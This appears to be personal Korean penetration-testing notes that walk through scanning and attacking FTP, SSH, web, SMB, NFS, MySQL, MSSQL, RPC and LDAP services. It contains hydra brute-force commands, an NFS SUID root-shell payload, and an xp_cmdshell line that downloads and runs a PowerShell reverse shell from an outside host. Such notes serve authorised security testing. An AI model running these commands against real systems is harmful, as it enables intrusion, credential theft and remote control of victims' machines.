# 1. 정보 수집
## 1.1. 포트 스캔
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
특정 호스트의 TCP 및 UDP 포트 상태를 조사하는 정보 수집 활동
- TCP : TCP 3-way Handshake 과정을 이용해 포트 상태 확인 (= Connect scan)
- UDP : 특정 페이로드를 사용해 각 포트 확인
</aside>

### 1.1.1. Masscan
https://github.com/robertdavidgraham/masscan
`masscan <IP대역> -p1-65535 --rate 10000 -oG masscan_output`

### 1.1.2. Rustscan
**######## 채워넣기 ########**

### 1.1.3. nmap
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
- **nmap 옵션**
    - `-sn` : ICMP scan (= `ping`)
    - `-sS` : SYN scan
        - TCP 핸드쉐이크의 플로우를 바꾸기 때문에 root 권한이 필요
        - -sV 옵션을 붙이면 SYN scan 이후에 Connect Scan을 하므로 -sV과 같이 사용 X
    - `-sU` : UDP scan
    - `-p-` : 포트 1~65535까지 모든 포트 스캐닝
        - 평소엔 사용하지 않고 하나의 호스트에 대해서 디테일하게 모의해킹을 할 때 사용
    - `--top-ports <숫자>` : 가장 흔한 포트 N개 뽑아서 스캐닝
    - `-T5` : 스캐닝 속도 조절 (T0 ~ T5)
        - 속도가 빠를 수록 쓸데없는 데이터도 많이 나오고 방화벽도 있어서 T3 정도가 적당함
    - `--min-rate 3000` : 스캐닝 속도 조절
    - `--open` : 열려있는 포트만 출력
    - `-oA <파일이름>` : nmap 스캔 결과 저장
    - `-Pn` : host discovery 기능을 끄고 바로 포트 스캔 진행
        - host discovery : icmp + 80 + 443 으로 호스트가 살아있는지 확인 후 port scan
        - ICMP 요청을 block 하거나 80/443 포트가 닫혀있는 경우가 많기 때문에 -Pn 필수!!
    - `-sT` : CONNECT scan 강제
        - root 권한으로 일반적인 nmap 스캔을 할 경우 무조건 SYN scan으로 실행됨
</aside>
1. 전체 포트 대상으로 포트 스캔
`nmap -p- --max-retries 1 -sS -Pn -n --open <IP주소> -oA tcpAll`
2. top port 1000개 빠르게 돌리기 (1번 결과와 2번 결과 크로스 체크)
`nmap --top-port 1000 -Pn -n --open -sS <IP주소> -oA`  
⇒ Masscan, Rustscan으로 sweeping 한번 때리고, 살아있는 호스트 대상으로 nmap을 돌리기

### 1.1.4. Bash/PowerShell Oneliner
nmap과 같은 포트 스캐닝 도구를 다운받지 못했을 때 bash 스크립트나 powershell 스크립트를 짜서 스캐닝
**######## 채워넣기 ########**

### 1.1.5. **Axiom**
**######## 채워넣기 ########**


## 1.2. 네트워크 서비스 스캐닝
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
대상 호스트의 열려 있는 포트에 어떤 네트워크 서비스가 실행중인지 파악하기 위한 행위
- Banner Grabbing : TCP 3-way Handshake가 끝난 뒤, 네트워크 서비스가 전송하는 서비스의 배너를 수신하는 방식으로 정보 수집
- Probing : 네트워크 서비스가 반응하는 Probe 들을 전송해 네트워크 서비스의 반응을 이끌어내는 방식으로 정보 수집
</aside>

### 1.2.1. nmap
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
- **nmap 옵션**
    - `-sV` : 배너 그래빙과 프로빙을 같이 진행
    - `-sC` : 식별된 네트워크 서비스가 있다면, Nmap의 "기본" 태그가 붙은 스크립트들을 실행
- /usr/share/nmap/nmap-service-probes : nmap이 사용하는 probe와 규칙들
</aside>
top port 1000개에서 나온 결과(오픈포트)를 가지고 정보 수집
`nmap -p <오픈포트> -sV -sC -Pn -n --open --min-rate 2000 <IP주소> -oA tcpDetailed`

### 1.2.2. nc (wireshark)
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
Nmap의 배너 그래빙으로도 네트워크 서비스에 관련된 정보가 나오지 않는 경우, `nc`을 이용해 직접적으로 포트에 연결하거나 와이어샤크를 통해 확인한다.
</aside>
`sudo wireshark`
`nc <IP주소> <포트번호>`

### 1.2.3. **클라이언트 프로그램**
ftp, ssh, mysql, nfs, samba - crackmapexecm enum4linux), …


# 2. 취약점 진단

## 2.1. FTP 취약점 진단
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
FTP(File Transfer Protocol)은 파일 전송 프로토콜로, 원격의 호스트와 파일을 주고받을 때 사용
- **[점검 항목]**
    1. 서비스 버전 확인 : 공개 취약점 및 익스플로잇이 존재하는지 확인
    2. 익명 로그인 (Anonymous Login) 확인
    3. 파일/디렉토리 읽기/쓰기 권한 확인
    4. 기본 계정과 비밀번호 확인 : admin:admin , ftp:password, root:root, …
- **[점검 포인트]**
    - 오래된 네트워크 서비스이기 때문에 공개된 취약점과 exploit이 많음
    - 파일 다운로드 : 중요 데이터(ex. 백업 데이터, 계정 정보, 기밀문건, 소스코드 등)
    - 파일 업로드 : 업로드한 파일을 다른 네트워크 서비스에서 실행시킬 수 있는지 확인
</aside>

### 2.1.1. FTP 서비스 이름, 버전, nmap 기본 스크립트 사용
`nmap -p 21 -sV -sC -Pn -n --open <IP주소>`

### 2.1.2. 익명 로그인 (Anonymous Login) 확인
`ftp <IP주소>` : 유저 이름 anonymous , 비밀번호는 아무거나 입력하여 로그인 되는지 확인

### 2.1.3. 읽기/쓰기 권한 확인
파일 다운로드나 업로드를 직접 실행하여 읽기/쓰기 권한이 있는지 확인

### 2.1.4. 기본 계정 이름 및 비밀번호 확인
네트워크 서비스 이름 및 버전 정보를 바탕으로 구글링을 통해 찾아서 로그인 시도


## 2.2. SSH 취약점 진단
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
SSH(Secure Shell)은 원격 호스트에 암호화된 방식으로 접속해 명령 실행 및 파일 전송을 할 수 있음
- **[점검 항목]**
    1. 사용자 인증 방법 : 비밀번호 로그인의 경우 설정이 미흡하다면 브루트포스 공격 등에 취약
        - (OpenSSH < 7.7) 브루트포스를 통해 로컬 유저 계정 이름 수집
    2. (OpenSSH < 6.6 + SFTP) : RCE
- **[점검 포인트]**
    - 오픈소스 운영으로 인해 취약점이 많진 않지만, 비밀번호 로그인이 가능한 경우 **브루트포스나 Password Spray, 크레데션 스터핑 등의 공격 가능성**
</aside>

### 2.2.1. 서비스 버전 확인
`nmap -p 22 -sV -sC -Pn -n --open <IP주소>`
`ssh <계정이름>@172.31.227.156 -p 2222`

### 2.2.2. 유저 이름 정보 수집 (OpenSSH < 7.7)
- **Metasploit**
`msfconsole -q`
`use auxiliary/scanner/ssh/ssh_enumusers`
`set RHOSTS <IP주소>`
`set RPORT <포트번호>`
`set user_file <wordlist>` : https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
`run`

- **hydra**
`hydra -L top-usernames-shortlist.txt -p dummy_password ssh://<IP주소>`

- **nmap**
`nmap --script ssh-brute -p 22 <IP주소>`

### 2.2.3. 브루트포스 대응 미흡/부재 확인
비밀번호 50개만 사용하여 브루트포스 공격 시도 (계정 잠금을 방지하기 위해 존재하지 않은 유저 이름 사용)
`cat /usr/share/wordlists/rockyou.txt | head -50 > pass.txt`
`hydra -l thisuserdoesnotexist -P pass.txt ssh://<IP주소>:22 -V -f`

## 2.3. HTTP/웹 취약점 진단
<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />
HTTP(Hypertext Transfer Protocol)은 웹에서 데이터를 전송하기 위한 기본적인 프로토콜
- SPA (Single Page Application) : 하나의 웹 페이지로 구성되어 있으며, 사용자와의 상호작용에 따라 필요한 부분만 동적으로 업데이트 됨
- MPA (Multi-Page Application) : 여러 개의 웹 페이지로 구성된 전통적인 형태의 웹
- **[점검 항목]**
    1. 웹 서버 버전 + 웹 어플리케이션 + 프레임워크 버전 확인
        - 공개 익스플로잇이나 기본적인 계정 정보 등 확인
        - wappalyzer chrome extension
        - robots.txt - hidden path 확인
    2. OWASP Top 10 및 흔한 웹 취약점 확인
    3. 디렉터리 브루트포싱
    4. 버츄얼 호스팅(Virtual Host) 이름 확인
</aside>

### 2.3.1. 소스코드 확인
<title> 태그나 <meta> 태그 등에서 백엔드 서버나 애플리케이션에 관련된 이름을 찾을 수 있습니다. 혹은 <a href> 태그 등에서 숨겨져 있던 디렉토리 등을 찾아낼 수 있다.

### 2.3.2. 기술 스택 확인
HTTP 응답 헤더에 웹서버/웹애플리케이션 프레임워크의 이름 및 버전 정보가 노출되었는지 확인한다.
`echo <URL> | docker run -i projectdiscovery/httpx -fr -fc 401,403,404 -silent -sc -title -nc -td`
`echo <URL> | whatweb -i /dev/stdin -a 1 --no-errors --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'`
wappalyzer 플러그인을 브라우저에 등록한 뒤 사용하여 확인할 수도 있다.

### 2.3.3. robots.txt 확인
https://<ip/dns>:<port>/robots.txt URL을 방문하여 숨겨진 Path가 있는 지 확인한다.

### 2.3.4. 웹 취약점 확인

### 2.3.5. 디렉토리 브루트포싱 (Directory Bruteforcing)
- **사전파일**
    | 목적 | 경로 | 설명 |
    | --- | --- | --- |
    | 기본 스캔 | `SecLists/Discovery/Web-Content/common.txt` | 가장 많이 쓰이는 기본 워드리스트 |
    | 강력한 스캔 | `SecLists/Discovery/Web-Content/raft-large-directories.txt` | 대형 디렉토리 리스트 |
    | 파일 중심 | `SecLists/Discovery/Web-Content/raft-large-files.txt` | 다양한 확장자의 파일 이름 리스트 |
    | 작은 빠른 스캔 | `SecLists/Discovery/Web-Content/quickhits.txt` | 빠른 테스트용 소형 리스트 |
    | 깊이 있는 스캔 | `SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt` | 디렉토리 리스트 중형 (장시간 탐지 시) |
    | 웹 서버별 최적화 | `SecLists/Discovery/Web-Content/apache.txt`, `iis.txt`, `tomcat.txt` 등 | 특정 웹 서버 대상 리스트 |

`gobuster dir -u <URL> -w <사전파일> -x php,got,txt,backup -s "200,301,302" -b ""`

- 확장자는 서버 언어에 맞게 찾고하는 파일 확장자를 넣어준다.
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt
- https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt

`ffuf -u http://example.com/FUZZ -w <사전파일> -mc 200,301,302`

- https://github.com/ffuf/ffuf
- 옵션
    - -mc 200 : 매치할 상태코드 지정
    - -fs 1234 : 특정 응답 길이(바이트) 제외
    - -e .php,.html,.txt : 확장자 리스트

### 2.3.6. vhost fuzzing

- **사전파일**
    
    
    | 목적 | 경로 | 설명 |
    | --- | --- | --- |
    | 기본 리스트 | `seclists/Discovery/DNS/subdomains-top1million-5000.txt` | 상위 5000개 서브도메인 |
    | 중형 리스트 | `seclists/Discovery/DNS/bitquark-subdomains-top100000.txt` | 상위 10만개 |
    | 대형 리스트 | `seclists/Discovery/DNS/fierce-hostlist.txt` | 매우 포괄적인 리스트 |
    | 빠른 테스트 | `seclists/Discovery/DNS/namelist.txt` | 비교적 소형 |

`ffuf -u http://FUZZ.example.com -w <사전파일> -H "Host: FUZZ.example.com"`

`ffuf -u http://example.com -w <사전파일> -H "Host: FUZZ.example.com"`

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

vhost fuzzing ≠ subdomain bruteforcing

| 항목 | **VHost Fuzzing** | **Subdomain Bruteforcing** |
| --- | --- | --- |
| **대상** | IP 주소 (또는 단일 호스트) | 도메인 이름 |
| **방식** | `Host` 헤더를 바꿔가며 요청 | DNS를 질의하여 존재하는 서브도메인 찾기 |
| **도구 예시** | ffuf, gobuster (vhost mode), feroxbuster | dnsx, subfinder, amass, gobuster (dns mode) |
| **HTTP 요청 필요** | O (HTTP 요청 보내서 반응 확인) | X (기본적으로 DNS 질의만) |
| **발견 가능 자산** | Virtual Host 기반으로 숨겨진 웹서비스 (ex. `admin.localhost`) | 서브도메인으로 분리된 웹서비스 (ex. `admin.example.com`) |
| **DNS 등록 필요 여부** | 불필요 (같은 IP 내부에서 가상호스팅으로 처리되므로) | 필요 (서브도메인은 DNS에 등록되어 있어야 함) |
| **용도** | 내부 시스템, shared hosting 환경, 우회된 admin 패널 찾기 | 대기업의 숨겨진 시스템, 다양한 환경의 자산 찾기 |
| **조건** | 웹 서버가 `Host` 헤더 기반으로 다르게 동작해야 함 | DNS 서버가 질의에 응답해야 함 |

IP 입력 시 특정 domain으로 리다이렉트 되는 경우 리버스 프록시가 있는 것을 가

</aside>

### 2.3.7. `.git` 디렉터리 덤프 및 소스코드 복원

1. 전체 git 저장소 다운로드
    
    `git-dumper http://<domain>/.git/ /tmp/target-repo/`
    
2. 커밋 히스토리 확인
    
    `git log --oneline`
    
3. 이전 커밋 상태 복원
    
    `git checkout .` : 제일 최근 커밋 상태 복원
    
    `git checkout <commit>` : 특정 커밋 상태 복원
    

## (참고) Wordpress 관련 취약점 진단

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html?highlight=wordpress#wordpress

**http://<URL>/wp-json/wp/v2/users** : 유저 이름 

**http://<URL>/?author=<숫자>** : user ID와 매핑되는 사용자의 정보 

**http://<URL>/wp-json/wp/v2/pages** : IP 주소 leak

참고 : https://www.invicti.com/blog/web-security/xml-rpc-protocol-ip-disclosure-attacks/

- **brute force**

유저 이름과 비밀번호를 따로 알아내야 하기 때문에 hydra 2번 실행해야 함

`hydra -L users.txt -p randompassword <IP주소> -s <포트번호> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -V`

`hydra -L wordpress-users.txt -P passwords.txt <IP주소> -s <포트번호> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -V`

- **wpscan**

`wpscan --url <URL>` : wordpress 관련 정보 스캔

`wpscan --url <URL> --passwords passwords.txt` : brute force

`wpscan --url <URL> -e ap, at --plugins-detection aggressive` : 설치된 테마, 플러그인 스캔

- **XML-RPC**

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

- **Admin 패널에 접근 시 RCE 방법**
1. 테마 수정하여 reverse php 코드 업로드
2. 취약한 플러그인 설치하여 RCE

## 2.4. SMB 취약점 진단

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

SMB(Server Message Block)은 윈도우 환경에서 네트워크에 파일이나 프린터를 공유할 때 사용

- Active Directory에 연결된 윈도우 서버에서는 기본적으로 사용하는 프로토콜
- 원래는 파일과 프린터 공유를 목적으로 만들어졌지만, 경우에 따라서는 명령을 수행하거나 원격으로 호스트에 접근하는데 사용되기도 한다.
- **[점검 항목]**
    1. Null Session : 계정 이름과 비밀번호 및 사용자 인증 단계를 거치지 않고 SMB를 사용
    2. 파일 읽기/쓰기 권한 확인하여 접근 가능한 쉐어(Share) 및 파일 체크
    3. Windows host라면, SMB 관련 취약점 확인 (MS08-067, MS17-010, SMBGhost, MS15-011 등)
    4. (네트워크 기반 공격) NTLM 릴레이 공격에 필요한 SMB Signing, SMBv1 등
</aside>

### 2.4.1. Null Session, Anonymous Session 확인

- **enum4linux**

`enum4linux -a <IP주소>` : null session 및 anonymous session 확인

- **netexec**

`netexec smb <IP주소> -u '' -p '' --shares` : null session 확인

`netexec smb <IP주소> -u 'a' -p '' --shares` : anonymous session 확인

- **smbmap**

`smbmap -H <IP주소>` : null session 확인

`smbmap -H <IP주소> -u 'a' -p ''` : anonymous session 확인

### 2.4.2. SMB 쉐어 접근 및 파일 진단

`smbclient \\\\<IP주소>\\<share> -U <user>`

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

**(참고) 기본적으로 활성화되는 share**

- 윈도우 환경에서 활성화되는 share
    - ADMIN$ : `C:\\System32`
    - C$ : `C:\\`
    - IPC$ : Inter-Process Communication 약자로, (내)외부로 Data 공유할 수 있도록 해줌
    - Users : `C:\\Users`
- DC 환경에서 활성화되는 share
    - NETLOGON : Domain에 가입된 컴퓨터들이 logon 시 실행할 script, binary
    - SYSVOL : Group Policy Object, logon 시 실행할 script(NETLOGON)가 들어있는 폴더
        - AD에서 중요한 역할
</aside>

### 2.4.3. SMB 관련 취약점 진단

`nmap -p 445 -sV --script='smb-vuln-*' -Pn --open <IP주소>`

- 리눅스 host 대상으론 별로 효과가 없지만, Windows host를 대상으로 진단을 한다면 무조건 해봐야 한다.

### 2.4.4. 다수의 호스트, 쉐어, 파일 진단 (manspider)

- **설치방법**
    
    `pip3 install pipx`
    
    `pipx install git+https://github.com/blacklanternsecurity/MANSPIDER`
    
1. **특정 파일 이름만 다운로드**

`manspider <IP주소> --sharenames <share> -f passwt customer backup database -u <유저> -p <비밀번호> [-d <도메인>]`

1. **특정 파일 확장자만 다운로드**

`manspider <IP주소> --sharenames <share> -e txt db bakup key pem rsa xml -u <유저> -p <비밀번호>`

### 2.4.5. (네트워크 기반 공격) NTLM 릴레이 공격에 필요한 SMB Signing, SMBv1 등

**######## 채워넣기 ########**

## 2.5. NFS 취약점진단

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

NFS(Network File System)은 네트워크를 통해 다른 시스템들의 파일시스템(Filesystem)을 접근하게 해주는 프로토콜 및 네트워크 서비스

- 기본적으로 포트 2049에서 실행되나, NFS 클라이언트들이 NFS와 관련된 정보들을 얻기 위해서는 포트 111 RPCBind/Portmapper 네트워크 서비스를 사용한다
- NFS를 통해 공격자가 SUID 비트가 설정된 악성코드를 업로드해 사용하기도 함
- **[점검 항목]**
    1. 접근 제어 : 어떤 디렉터리들이 노출중이며, 해당 디렉토리에 접근가능한 IP주소들은 무엇인지
    2. 파일 권한 : 파일 및 디렉터리의 읽기/쓰기 권한
    3. No_Root_Squash 설정 확인
        - 기본적으로 클라이언트들은 유저 권한이 **nobody** 라는 굉장히 낮은 권한으로 접근
        - no_root_squash 활성화 - 유저 권한을 무시하는 설정이 활성화되어 있진 않은지 확인
</aside>

### 2.5.1. 기본 Nmap 정보 수집 및 취약점 진단

`nmap -p 111,2049 -Pn -n --open -sV --script="nfs-*" <IP주소>` 

 - nfs-showmount : 노출중인 mount와 접근 가능한 IP 주소 (대역)를 알 수 있다.

 - nfs-ls : NFS에 직접 접근하여 파일/디렉터리 리스트업

 - nfs-statfs : 파일 시스템과 관련된 stat 알려줌

⇒ NFS와 관련된 nmap script는 한번에 잘 동작되지 않는 경우가 많다. 제대로 나올때까지 여러번 돌려주기!

### 2.5.2. Showmount - 접근 제어 확인

`showmount -e <IP주소>`

### 2.5.3. 파일 권한 확인

NFS 서버의 디렉토리들을 마운트 ( mount ) 한 뒤 파일 시스템의 권한을 확인하기

`mkdir /mnt/raccoon`

`mount 172.31.139.232:/public-nfs /mnt/raccoon`

### 2.5.4. No_Root_Squash 활성화 확인

no_root_squash 옵션의 활성화 상태를 NFS 클라이언트가 원격에서 확인할 방법은 없기 때문에 디렉터리를 마운트 한 뒤 직접 루트 계정을 이용해 파일을 생성해봄으로써 확인해봐야 한다.

SUID 비트가 설정되어 있는 페이로드나 쉘을 업로드할 경우, 타겟 호스트에서 낮은 권한의 유저에서 루트 유저로 권한 상승을 진행할 수도 있음

1. 페이로드 생성 (mount된 폴더에 생성 필요)
    
    `echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > root_shell.c` 
    
    `gcc root_shell.c -o root_shell`
    
2. SUID 비트 설정
    
    `chmod +s root_shell`
    
3. 희생자 머신에서 실행
    
    `./root_shell`
    

## 2.6. MySQL 취약점진단

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

MySQL(My Structured Query Language)는 오픈소스 관계형 데이터베이스 관리 시스템

- MySQL은 데이터베이스 서비스이기 때문에 네트워크에 노출되어 있지 않는 경우가 많음. 다만, 내부망 같이 한정된 네트워크 내에서는 MySQL 포트를 노출 시키는 경우가 많다.
- **[점검 항목]**
    1. 버전 정보 및 호스트 이름 확인
    2. 접근 제어 및 기본 계정 정보(root:’’, root:root, root:password, admin:admin) 확인
        1. root 유저는 로컬호스트에서 접속할 때 비밀번호가 필요없는데, 원격에서도 그렇게 설정한 경우도 있어서 확인 필요
    3. 원격으로 접속 가능하다면, 데이터베이스 데이터 탈취 가능성 확인
        1. 유저 계정 정보, 개인정보 확인하고, 있다면 암호화가 되어있는 가를 확인한다.
        2. 비밀번호 - 해시화 확인
        3. 해시화가 되어있다면, 취약한 해시 알고리즘 확인
        4. 취약한 해시 알고리즘을 사용하고 있다면, 해시 크래킹 (Hash Cracking)
    4. 탈취한 계정 정보를 다른 네트워크 서비스에 사용 확인 = 크레덴셜 스터핑
</aside>

### 2.6.1. Nmap 기본 스캔

`nmap -p <포트번호> -Pn -n --open -sV --script="mysql*" <IP주소>`

### 2.6.2. MySQL 접근

`mysql -u <유저> -p -h <IP주소> -P <포트번호>`

- **원격에서도 root 유저에 패스워드 없이 접근할 수 있는지 확인**

`mysql -u root -p -h <IP주소> -P <포트번호>`

### 2.6.3. 원격 데이터베이스 덤프 후 암호화,해시화 등 확인

`mysqldump -h <IP주소> -P <포트번호> -u <유저> -p <DB이름> <테이블이름> > <파일이름>.sql`

```sql
# 포멧
< 데이터베이스 버전, 호스트 IP, 데이터베이스 이름 등의 메타데이터 >
-- MariaDB dump 10.19 Distrib 10.11.4-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: 172.31.198.21 Database: production
-- ------------------------------------------------------
-- Server version 8.1.0

# 테이블의 열 이릌름, 종류 등
< --- Table structure for talbe <테이블> --- >
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
`id` int NOT NULL AUTO_INCREMENT,
`username` varchar(50) NOT NULL,
`password` varchar(255) NOT NULL,
PRIMARY KEY (`id`)
)

# 테이블안에 들어가 있는 데이터
< --- -- Dumping data for table `users` --- >
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES
(1,'GrootADMINBHPT@2244','admin'),
(2,'P@ssw0rd123','jackson.ellie'),
(3,'Br0wn!eL0ve','brown.mia'),
[ . . . ]
```

`hash-identifier <hash>` : 해시화된 데이터가 있다면 어떤 종류의 함수 알고리즘인지 확인

## 2.7. mssql 취약점 진단 - 1433 port

### 2.7.1. nmap 기본 스캔

`nmap -p 1433 -Pn -n --open -sV --script="ms-sql*" <IP주소>`

### 2.7.2. mssql 접근

 https://learn.microsoft.com/ko-kr/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Clinux&pivots=cs1-bash

- **sqlcmd**

`sqlcmd -S <IP주소> -U <유저이름> -P <비밀번호>`

- **sqsh**

`sqsh -S <IP주소> -U <유저이름> -P <비밀번호>`

### 2.7.3 계정정보 등 query 질의

```sql
- 데이터베이스 목록 조회
SELECT name FROM sys.databases;

- 테이블 목록 조회
USE <데이터베이스명>; SELECT name FROM sys.tables;

- 사용자 조회
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

- hased password 조회
SELECT * FROM master.sys.syslogins;
```

### 2.7.4. **xp_cmdshell**

먼저 xp_cmdshell이 비활성화되어 있다면 활성화가 필요하다

```
EXEC sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO

EXEC sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO

EXECUTE sp_configure 'show advanced options', 0;
GO
RECONFIGURE;
GO
```

xp_cmdshell이 활성화되어 있다면, 임의의 명령어를 실행할 수 있다.

```
EXEC master..xp_cmdshell '명령어' 
GO

EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.33/powershell_reverse_shell.ps1") | powershell -noprofile'
GO
** Windows reverse ps1 코드 : https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1
```

### 2.7.5. 해시화된 password crack

Step 1) 해시화된 패스워드 추출 (계정 필요)

`nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=<유저이름>,mssql.password=<비밀번호> <IP주소>`

Step 2) 파일로 저장

```
ex)
sa:0x0200b3c7225758325b93e979bccc3c749ecc5bd1a821932932e0325729a7ba4a5e99c5531eb851dafbcd3e317376c3bc8566283ba48c21e3ddf34c163d8e665631edaf4c1891
##MS_PolicyEventProcessingLogin##:0x0200b2da0b68b11e4de053d8e5a93702ecc0050755843e6d5094bdbc7bf64cf768970057654c41f902c49c4d828834f6d19e4791b2c23ba0a61469d720180f1fcdbdd5108e7a
##MS_PolicyTsqlExecutionLogin##:0x0200a84cfff836830071e30bd130d77b443bc6768d91ad7967bf2b54392904a29fb12621b7412d28dfc0e237e19d4d0befe75e2b7dadfddfbf01f9e015b9172aafe148a939d1 
```

Step 3) John-The-Ripper를 통해 password crack

## 2.8. RPC 취약점진단

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

Remote Procedure Call의 약자로, 원격 프로시저(함수, 기능) 호출할 수 있다.

- 윈도우에는 service, 파일 CRUD 등 OS를 구성하는데 필요한 내부 기능이 있는데, 이걸 원격에서 호출할 수 있도록 제공하는 것
- SMB와 같은 서비스에서 행해지는 파일/폴더 공유도 RPC 프로토콜을 통해 이루어짐.
</aside>

### 2.8.1. null binding 확인

- **rpcclient**

`rpcclient -U "" -N <IP주소>`

null binding이 가능하다면 낮은 권한으로도 사용할 수 있는 기능(프로시저)이 있는지 확인해야 한다.

rpcclient $> `enumdomusers` : 유저 정보 수집

- **crackmapexec**

`crackampexec smb <IP주소> -u '' -p '' --users` : 내부적으로 RPC 프로토콜을 통해 유저 정보 수집

### 2.8.2. 정보 수집

- **rpcdump.py**

https://github.com/fortra/impacket/blob/master/examples/rpcdump.py

- **script 수정 필요**
    
    `logger.init(options.ts, options.debug)` → `logger.init()`
    

null binding이 된다면, 도메인 SID, 사용자, 그룹 등 확인 가능함

`rpcdump.py @<IP주소>`

| UUID | 인터페이스 이름 (Friendly Name) | 주요 기능 / 목적 | 관심 이유 |
| --- | --- | --- | --- |
| **12345778-1234-ABCD-EF00-0123456789AB** | lsarpc | Local Security Authority (LSA) | 도메인 정책, 트러스트 정보, SID ↔ 이름 변환 |
| **4B324FC8-1670-01D3-1278-5A47BF6EE188** | samr (samss, samrd 등) | Security Account Manager | 사용자/그룹 리스트, SID, 계정 정책 등 |
| **367ABB81-9844-35F1-AD32-98F038001003** | eventlog | Windows Event Log Service | 보안 로그 열람 (보통 admin 필요) |
| **6BFFD098-A112-3610-9833-012892020162** | srvsvc | Server Service | 공유 목록 조회, 사용자 세션 확인 |
| **8A885D04-1CEB-11C9-9FE8-08002B104860** | IObjectExporter (RPC Endpoint Mapper) | 일반 RPC 통신 (포트/바인딩 정보 조회) |  |
| **e3514235-4b06-11d1-ab04-00c04fc2dcd2** | dRSR (Directory Replication Service Remote) | AD 복제 | AD 정보 추출 가능 (ex. dcsync 공격) |
- **lookupsid.py**

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

**RID (Relative Identifier)** : Active Directory(AD)나 Windows 시스템에서 계정/그룹을 식별하기 위한 고유 번호의 일부로, SID(Security Identifier)의 끝부분에 붙는 값

| RID | 의미 |
| --- | --- |
| 500 | 도메인 관리자 (Administrator) |
| 501 | Guest |
| 512 | Domain Admins 그룹 |
| 513 | Domain Users 그룹 |
| 1000 이상 | 일반 사용자 계정 (자동 생성됨) |

ex) `SID: S-1-5-21-3623811015-3361044348-30300820-500`

- SID = S-1-5-21-3623811015-3361044348-30300820
- RID = 500
</aside>

https://github.com/fortra/impacket/blob/master/examples/lookupsid.py

Null Session으로 SID의 공통 부분(S-1-5-21-xxx...)을 얻을 수 있다며, 그 뒤에 500~1050 등 RID를 붙여서 각 SID가 어떤 유저인지 알아낼수 있음

`python lookupsid.py <IP주소>`

`python lookupsid.py ''@<IP주소>` : null binding 시도

## 2.9. LDAP 취약점진단

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

Light Directory Access Protocol의 약자로, 직관적으로 말하면 가볍게(쉽게) 디렉터리에 접근할 수 있게 해주는 프로토콜이다.

- AD엔 object들의 (민감한 부분을 제외한) 전반적인 정보들이 전화번호부처럼 정리되어 있고, 이 정보들을 DC에서 관리하고 있다.
- 이 전화번호부를 Directory 라고 하고, ldap는 이 Directory에 쉽게 접근할 수 있게 해준다.
</aside>

### 2.9.1. null binding 확인

null bidning이 가능하다면 AD Directory에 접근 가능하다는 뜻으로 유효한 정보들을 수집할 수 있다.

`ldapsearch -H "ldap://<IP주소>" -b "DC=htb,DC=local" -D "" -w ""`

# 3. 취약점 공격

## 3.1. 계정 정보 기반 공격

<aside>
<img src="/icons/compose_gray.svg" alt="/icons/compose_gray.svg" width="40px" />

1. 브루트포스 공격 (Bruteforce Attack)
    
    : 조합 가능한 모든 문자열을 사용해 로그인을 시도하는 공격 방식
    
2. 사전 공격 (Dictionary Attack)
    
    : 이미 존재하는 비밀번호 사전을 이용하는 브루트포스 공격의 일종
    
3. 비밀번호 스프레이 공격 (Password Spraying Attack)
    
    : 여러 유저 계정에 대해 단일 비밀번호로 로그인 시도를 하는 공격 방식
    
4. 크레덴셜 스터핑 공격 (Credential Stuffing Attack)
    
    : 상대방과 관련해 이전에 유출된 사용자명이나 비밀번호 조합을 다른 웹사이트, 네트워크 서비스, 운영체제 등에 사용해 로그인을 시도하는 공격 기법
    
5. 디폴트/기본 계정 정보 확인 (Default Credentials/Passwords)
</aside>

### 3.1.1. 브루트포스 공격 (Bruteforce Attack)

